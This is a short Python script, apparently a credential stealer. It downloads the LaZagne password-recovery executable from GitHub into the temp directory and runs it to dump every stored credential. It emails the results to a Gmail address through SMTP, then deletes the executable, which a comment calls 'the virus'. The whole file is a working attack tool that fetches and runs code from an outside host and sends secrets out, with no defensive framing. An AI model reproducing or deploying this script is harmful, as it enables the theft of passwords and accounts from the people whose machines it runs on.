import requests
import smtplib
import subprocess
import os
import tempfile
def download(url):
    get_response=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb")as file:
        file.write(get_response.content)

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
#finding temporary directory
temp_dir=tempfile.gettempdir()
#changing from default location to tmp directorys
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result=subprocess.check_output("laZagne.exe all",shell=True)
send_mail("y*************@gmail.com","password",result)
#removes the virus after the work done
os.remove("laZagne.exe")
